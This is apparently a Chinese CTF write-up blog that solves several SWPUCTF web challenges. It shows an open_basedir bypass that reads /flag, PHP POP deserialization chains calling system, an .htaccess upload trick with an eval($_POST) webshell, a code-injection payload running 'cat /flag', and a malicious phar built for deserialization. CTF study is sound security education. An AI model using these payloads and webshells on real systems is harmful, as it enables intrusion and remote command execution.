<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">'sub'</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'sub'</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'..'</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>);<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/'</span>);<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-string">'/'</span>));<span class="hljs-meta">?&gt;</span> <span class="hljs-comment">//列举根目录</span><br>    <br><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-string">'test'</span>); <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'test'</span>); <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'..'</span>); <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>); <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>); <span class="hljs-title function_ invoke__">chdir</span>(<span class="hljs-string">'..'</span>); <span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">'open_basedir'</span>,<span class="hljs-string">'/'</span>); <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">'/flag'</span>);<span class="hljs-meta">?&gt;</span><span class="hljs-comment">//拿到flag</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240310161450280.png" alt="image-20240310161450280"></p>
<h1>[SWPUCTF 2022 新生赛]ez_1zpop</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dxg</span></span><br><span class="hljs-class"></span>{<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fmm</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>{<br>      <span class="hljs-keyword">return</span> <span class="hljs-string">"nonono"</span>;<br>   }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lt</span></span><br><span class="hljs-class"></span>{<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$impo</span>=<span class="hljs-string">'hi'</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$md51</span>=<span class="hljs-string">'weclome'</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$md52</span>=<span class="hljs-string">'to NSS'</span>;<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>{<br>      <span class="hljs-variable language_">$this</span>-&gt;impo = <span class="hljs-keyword">new</span> dxg;<br>   }<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>{<br>      <span class="hljs-variable language_">$this</span>-&gt;impo = <span class="hljs-keyword">new</span> dxg;<br>      <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;impo-&gt;<span class="hljs-title function_ invoke__">fmm</span>();<br>   }<br><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>{<br>      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;impo) &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md51) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$this</span>-&gt;md52) &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;md51 != <span class="hljs-variable language_">$this</span>-&gt;md52)<br>         <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;impo-&gt;<span class="hljs-title function_ invoke__">fmm</span>();<br>   }<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>{<br>      <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>;<br>   }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fin</span></span><br><span class="hljs-class"></span>{<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$url</span> = <span class="hljs-string">'https://www.ctfer.vip'</span>;<br>   <span class="hljs-keyword">public</span> <span class="hljs-variable">$title</span>;<br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">fmm</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">   </span>{<br>      <span class="hljs-variable">$b</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>      <span class="hljs-variable">$b</span>(<span class="hljs-variable language_">$this</span>-&gt;title);<br>   }<br>}<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'NSS'</span>])) {<br>   <span class="hljs-variable">$Data</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'NSS'</span>]);<br>} <span class="hljs-keyword">else</span> {<br>   <span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>简单的链子</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">dxg</span></span><br><span class="hljs-class"></span>{<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">lt</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$impo</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$md51</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$md52</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">fin</span></span><br><span class="hljs-class"></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$url</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$title</span>;<br>}<br><span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">lt</span>();<br><span class="hljs-variable">$pop</span>-&gt;impo = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">fin</span>();<br><span class="hljs-variable">$pop</span>-&gt;md51 = <span class="hljs-string">'QNKCDZO'</span>;<br><span class="hljs-variable">$pop</span>-&gt;md52 = <span class="hljs-string">'240610708'</span>;<br><span class="hljs-variable">$pop</span>-&gt;impo-&gt;a = <span class="hljs-string">'system'</span>;<br><span class="hljs-variable">$pop</span>-&gt;impo-&gt;title = <span class="hljs-string">'ls /'</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);<br><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240310211459155.png" alt="image-20240310211459155"></p>
<h1>[SWPUCTF 2022 新生赛]funny_web</h1>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311183646287.png" alt="image-20240311183646287"></p>
<p>这里提示账户是实验室名字：NSS，密码是群里某位成员的QQ，管理员全尝试一次就行了：2122693401</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Type: text/html;charset=utf-8"</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>])) {<br>    <span class="hljs-variable">$num</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'num'</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$num</span> != <span class="hljs-string">'12345'</span>) {<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">intval</span>(<span class="hljs-variable">$num</span>) == <span class="hljs-string">'12345'</span>) {<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$FLAG</span>;<br>        }<br>    } <span class="hljs-keyword">else</span> {<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">"这为何相等又不相等"</span>;<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>简单的PHP特性，可以换进制绕过、小数点、数学计算法、二次取反等等：12345a</p>
<h1>[SWPUCTF 2022 新生赛]Ez_upload</h1>
<p>文件上传，这里是过滤了php后缀的ph，那畸形后缀名绕过就别想了。之后上传正常的jpg发现还是不对，就尴尬了，我寻思都很正常，看了wp发现，那个提示就是单纯的检测文件内容而已。搞得我有点晕</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185536689.png" alt="image-20240311185536689"></p>
<p>这里的其他类型我以为就是mime的类型不对或者是后缀被过滤了。也反映出来分析文件上传的思路就不行，且上传正常jpg就应该注意内容的正常与否，需要一步步排除，不让就如同我一样，不知道过滤了什么</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185647009.png" alt="image-20240311185647009"></p>
<p>这里更换正常内容，就成功上传，显然就是利用.htaccess文件了，但又限制文件内容，翻一下笔记</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185803235.png" alt="image-20240311185803235"></p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185809454.png" alt="image-20240311185809454"></p>
<p>正好，那直接上就对了</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">AddType application/x-httpd-php <span class="hljs-selector-class">.bcx</span><br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311185902055.png" alt="image-20240311185902055"></p>
<p>先成功让其解析bcx文件，接着上传</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">&lt;script language="php"&gt;<span class="hljs-built_in">eval</span>($_POST[<span class="hljs-number">1</span>]);&lt;/script&gt;<br></code></pre></td></tr></tbody></table></figure>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311190025065.png" alt="image-20240311190025065"></p>
<p>上传后，发现flag在env中</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311190219520.png" alt="image-20240311190219520"></p>
<h1>[SWPUCTF 2023 秋季新生赛]If_else</h1>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php">某一天,NSSCTF给了你一次机会,让你来自定义<span class="hljs-keyword">if</span>中的条件,提交后访问check.php查看结果<br><br>提交方式<span class="hljs-variable">$_POST</span>[<span class="hljs-string">"check"</span>]<br><br>记得访问一下check.php哦~<br><br>check.php的内容<br><br><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$a</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-variable">$b</span>=<span class="hljs-literal">false</span>;<br>    <span class="hljs-keyword">if</span>(你提交的部分将会被写至这里)<br>    {<span class="hljs-variable">$a</span>=<span class="hljs-literal">true</span>;}<br>    <span class="hljs-keyword">else</span><br>    {<span class="hljs-variable">$b</span>=<span class="hljs-literal">true</span>;}<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$a</span>===<span class="hljs-literal">true</span>&amp;&amp;<span class="hljs-variable">$b</span>===<span class="hljs-literal">true</span>)<br>    <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">system</span>(cat /flag));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>这里分析一波就可以知道，根本不可能绕过if语句，我也是陷误区了，当时还想着是否可以闭合来执行命令，但没成功，看了wp才知道我构造就错了。两种方法：</p>
<p>一个是if条件里面通过eval直接就可以执行命令，且能回显出来？？？这里有点不懂，先记下来吧</p>
<figure class="highlight scss"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">check=<span class="hljs-built_in">eval</span>(system('cat /flag'))<br></code></pre></td></tr></tbody></table></figure>
<p>一个是通过闭合：check=1) eval(system(‘cat /flag’));/*</p>
<p>这里我当时没成功就是用的是//，这种只能注释一行，显然不行</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311192317024.png" alt="image-20240311192317024"></p>
<h1>[SWPUCTF 2021 新生赛]babyunser</h1>
<p>这里刚开始给了上传文件与读取文件功能。因为他直接将文件后缀改为了 txt，webshell就别想了，尝试了半天，我突然想到目录穿越，不过过滤了…/，之后又想到伪协议，幸运地是file没过滤，直接就能读取到主目录下的文件了</p>
<p>读取了read.php与upload.php发现还存在class.php，代码如下</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">'aa'</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$this</span>-&gt;name);<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>{<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-string">"\&lt;?php @eval(\$_POST[1]);?&gt;"</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span>-&gt;{<span class="hljs-variable language_">$this</span>-&gt;func}(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'cmd'</span>]); <span class="hljs-comment">//cmd=ls等等</span><br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>=<span class="hljs-string">'surprise'</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;filename=<span class="hljs-variable">$filename</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">'/^\/|php:|data|zip|\.\.\//i'</span>,<span class="hljs-variable">$this</span>-&gt;filename)){<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">'这不合理'</span>);<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params"><span class="hljs-variable">$var</span></span>)</span>{<br>        <span class="hljs-variable">$filename</span>=<span class="hljs-variable language_">$this</span>-&gt;filename;<br>        <span class="hljs-variable">$lt</span>=<span class="hljs-variable language_">$this</span>-&gt;filename-&gt;<span class="hljs-variable">$var</span>;<br>        <span class="hljs-comment">//此功能废弃，不想写了</span><br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFile</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">filter</span>();<br>        <span class="hljs-variable">$contents</span>=<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$this</span>-&gt;filename);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$contents</span>)){<br>            <span class="hljs-keyword">return</span> <span class="hljs-variable">$contents</span>;<br>        }<span class="hljs-keyword">else</span>{<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">"404 not found"</span>);<br>        }<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;{<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'method'</span>]}(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'var'</span>]);  <span class="hljs-comment">//method=write;var=content</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;content;<br>    }<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">'eval'</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;arg=<span class="hljs-string">'phpinfo();'</span>;<br>    }<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$arg</span></span>)</span>{<br>        <span class="hljs-variable">$name</span>(<span class="hljs-variable">$arg</span>[<span class="hljs-number">0</span>]);<br>    }<br>}<br></code></pre></td></tr></tbody></table></figure>
<p>其中read.php代码</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311194527648.png" alt="image-20240311194527648"></p>
<p>可以看到这里调用了getfile函数，我们跟踪一下会发现，该函数存在<code>file_get_contents</code>方法，再结合文件上传，不难想到phar反序列化了，接下来就先构造链子，在构造phar文件</p>
<p>不过这里先说一个误区，当时我看到文件里面有众多需要post传参的参数，我就蒙了，我想着怎么在构造链子的时候进行post传参啊，结果就不会了，看了wp发现。如果我们上传了phar文件，当访问的时候，他会进行反序列化，此时我们可以在读取页面进行post传参即可。</p>
<p>直接看链子aa类-》aa类.name-》zz类.tostring-》zz类.write-》ff类.get-》xx类.call</p>
<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">aa</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ff</span></span>{<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$content</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">'system'</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{<br>        <span class="hljs-variable language_">$this</span>-&gt;content=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">xx</span>(); <span class="hljs-comment">//注意content的赋值</span><br>    }<br>}<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">zz</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$filename</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$content</span>;<br>}<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">xx</span></span>{<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$arg</span>;<br>}<br><br><span class="hljs-variable">$phar</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">"exp.phar"</span>); <span class="hljs-comment">//后缀名必须为phar</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">'&lt;?php __HALT_COMPILER();?&gt;'</span>); <span class="hljs-comment">//设置stub</span><br><span class="hljs-variable">$pop</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">aa</span>();<br><span class="hljs-variable">$pop</span>-&gt;name = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">zz</span>();<br><span class="hljs-variable">$pop</span>-&gt;name-&gt;filename = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">ff</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$pop</span>); <span class="hljs-comment">//将自定义的meta-data存入manifest</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">"test.txt"</span>, <span class="hljs-string">"test"</span>); <span class="hljs-comment">//添加要压缩的文件</span><br><span class="hljs-comment">//签名自动计算</span><br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></tbody></table></figure>
<p>最终上传文件后，用phar读取文件即可</p>
<p><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240311201853066.png" alt="image-20240311201853066"></p>
<h1>[SWPUCTF 2023 秋季新生赛]RCE-PLUS</h1>
